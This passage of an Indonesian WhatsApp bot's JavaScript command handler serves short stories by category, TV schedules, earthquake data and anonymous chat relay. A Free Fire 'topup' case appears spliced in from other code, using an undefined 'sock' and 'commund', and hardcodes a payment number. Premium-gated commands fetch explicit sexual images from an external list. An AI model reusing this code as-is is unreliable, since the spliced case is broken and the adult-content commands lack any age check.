conn.sendMessage(from, { image: { url: random.female }, caption: `Fofo Couple Female` }, { quoted: msg })
}
break

case 'cerpen-anak':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`anak`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-bahasadaerah':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`bahasa daerah`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-bahasainggris':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`bahasa Inggris`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-bahasajawa':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`bahasa jawa`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-bahasasunda':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`bahasa sunda`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-budaya':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`budaya`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cinta':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`cinta`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintaislami':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`cinta islami`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintapertama':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`cinta pertama`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintaromantis':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`cinta romantis`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintasedih':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`cinta sedih`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintasegitiga':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`Cinta segitiga`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintasejati':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`cinta sejati`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-galau':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`galau`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-gokil':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`gokil`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-inspiratif':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`inspiratif`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-jepang':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`jepang`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-kehidupan':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`kehidupan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-keluarga':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`keluarga`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-kisahnyata':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`kisah nyata`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-korea':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`korea`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-kristen':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`kristen`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'topup':{ //Create By Daffa (Walau liat readme aowkwowk) 
if (!q) return reply(`Example : ${command} id|jumlah`) 
try {
id = q.split('|')[0]
jumlah = q.split('|')[1]
ff = await hikki.game.nickNameFreefire(id) 
const topup = async function topupFreeFire() {
const makeSession = await hikki.game.topupFreeFire(id, jumlah) 
return await hikki.game.payDiamond(makeSession, '081938835391')
}
const top = await topup() 
sock.sendMessage(from, { image : { url : top.qrCode}, caption : `Payment : ${top.paymentMethod}\nId : ${id}\nJumlah : ${jumlah} Diamond\nScan & Bayar Maksimal 30 detik setelah qr ini keluar`}) 
} catch (e) { return reply(`Sistem Error atau Nominal Diamond/Id\nUser Tidak ada\nList Nominal Diamond\n5 Dm\n12 Dm\n70 Dm\n140 Dm\n355 Dm\n720 Dm`) }
}
addCmd(command.slice(1), 1, commund)
break
case 'cerpen-liburan':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`liburan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-malaysia':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`malaysia`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-mengharukan':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`mengharukan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-misteri':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`misteri`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-motivasi':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`motivasi`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-nasihat':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`nasihat`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-nasionalisme':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`nasionalisme`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-olahraga':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`olahraga`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-patahhati':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`patah hati`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-penantian':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`penantian`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-pendidikan':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`pendidikan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-pengalaman':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`pengalaman pribadi`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-pengorbanan':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`pengorbanan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-penyesalan':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`penyesalan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-perjuangan':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`perjuangan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-perpisahan':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`perpisahan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-persahabatan':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`persahabatan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-petualangan':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`petualangan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-ramadhan':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`ramadhan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-remaja':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`remaja`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-rindu':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`rindu`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-rohani':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`rohani`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-romantis':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`romantis`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-sastra':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`sastra`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-sedih':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`sedih`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-sejarah':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let cerpe = await cerpen(`sejarah`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'hentai':
case 'ahegao':
case 'ass':
case 'bdsm':
case 'cuckold':
case 'cum':
case 'ero':
case 'femdom':
case 'foot':
case 'gangbang':
case 'glasses':
case 'jahy':
case 'masturbation':
case 'orgy':
case 'panties':
case 'pussy':
case 'thighs':
case 'yuri':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
let cndn = await fetchJson(`https://raw.githubusercontent.com/jepribarus/JB-Api/main/nsfw/${command}.json`)
let random = cndn[Math.floor(Math.random() * cndn.length)]
conn.sendMessage(m.chat, { image: { url: random }, caption: `Nih Kak` }, { quoted: fakekirbotz })
}
break
case 'jadwaltv': {
if (!q) return reply(`Contoh : #${command} Rcti`) 
let tivi = await jadwalTV(q) 
let texoy = `Jadwal TV ${tivi.channel}\n\n`
for (let i of tivi.result) {
texoy += `Tanggal : ${i.date}\n`
texoy += `Acara :${i.event}\n\n`
}
reply(texoy) 
}
break
case 'gempa':
let gempaaa = await gempa() 
let gempanyy = '*INFO GEMPA*\n'
for (let i of gempaaa){
gempanyy +=`Tanggal : ${i.date}\nKordinat : ${i.locate}\nMagnitude :${i.magnitude}\nLokasi ${i.location}\nDaerah bahaya :${i.warning}\n\n`
}
reply(gempanyy)
break
case 'gempanow':{
let gemp = await gempaNow() 
let texih = 'GEMPA-NOW\n\n'
for (let i of gemp){
texih += `Tanggal : ${i.date}
latitude : ${i.latitude} 
longitude : ${i.longitude} 
Magnitude :${i.magnitude}
Lokasi ${i.location}
Kedalaman :${i.depth}\n\n`
}
reply(texih)
}
break
case 'bioskopnow': {
let skop = await bioskopNow()
let storee = '❉─────────────────────❉\n'
for (let i of skop ){
storee += `\n*「 *JADWAL BIOSKOP NOW* 」*\n
- *Judul* : ${i.title}
- *Link* : ${i.url}\n
- *Genre* : ${i.genre}
- *Durasi* : ${i.duration}
- *Tayang di* : ${i.playingAt}\n❉─────────────────────❉`
reply(storee) 
}
}
break
case 'latintoaksara':{
if (!q) return reply(`Contoh : #${command} Makan bang`) 
let uios = await latinToAksara(q) 
reply(uios) 
}
break
case 'aksaratolatin':{
if (!q) return reply(`Contoh : #${command} ꦪꦺꦴꦲꦺꦴ`) 
let uios = await aksaraToLatin(q) 
reply(uios) 
}
break

/*━━━━━━━[ pembatas case ]━━━━━━━*/
default:

if (!isCmd) {
if (cekPesan("id", sender) == null) return
if (cekPesan("teman", sender) == false) return
if (m.messages[0].type == "conversation" || m.messages[0].type == "extendedTextMessage") {
try{ var chat_anonymous = m.messages[0].message.extendedTextMessage.text } catch (err) { var chat_anonymous = m.messages[0].message.conversation }
let text_nya_menfes = `*ANONYMOUS CHAT*
💬 : ${chat_anonymous}`
conn.sendMessage(cekPesan("teman", sender), {text:text_nya_menfes})
conn.sendMessage(from, {text:'pesan diteruskan'}, {quoted:msg})
}}

// AUTHOR : OHLX BOT
// INI CONSOLE LOG JNGN EDIT

}} catch (err) {
console.log(color('[ERROR]', 'red'), err)
server_eror.push({"error": `${err}`})
fs.writeFileSync('./database/func_error.json', JSON.stringify(server_eror))
}}
